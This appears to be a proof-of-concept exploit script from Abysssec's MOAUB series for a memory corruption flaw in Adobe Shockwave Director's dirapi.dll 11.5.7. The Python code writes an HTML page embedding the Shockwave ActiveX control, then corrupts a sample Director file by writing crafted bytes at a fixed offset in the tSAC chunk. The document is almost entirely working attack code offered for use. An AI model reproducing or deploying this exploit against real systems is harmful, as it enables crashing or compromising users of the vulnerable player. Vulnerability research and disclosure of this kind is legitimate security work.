'''
 
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

'''

'''
  Title               : Adobe Shockwave Director tSAC Chunk memory corruption
  Version             : dirapi.dll 11.5.7 
  Analysis            : http://www.abysssec.com
  Vendor              : http://www.adobe.com
  Impact              : Med/High
  Contact             : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter             : @abysssec

http://www.exploit-db.com/moaub-22-adobe-shockwave-director-tsac-chunk-memory-corruption/
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15076.zip (moaub-22-exploit.zip)

'''


import sys

temp =  """<!-- saved from url=(0013)about:internet -->

<object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258"
 codebase="http://download.macromedia.com/pub/shockwave/cabs/director/sw.cab#version=11,5,0,593"
 ID=wineglass>
	<param name=src value="poc.dir">
	<param name=PlayerVersion value=11>


</object>
"""
htmlTest = open('poc.html', 'wb')
htmlTest.write(temp)
htmlTest.close()

sampleFile = open('sample.dir','rb')
pocFile = open("poc.DIR",'wb')			
pocFile.write(sampleFile.read(-1))	
sampleFile.close()
pocFile.seek(13168)
pocFile.write("\xff\xff\xff\xff\x11\x11")
pocFile.close()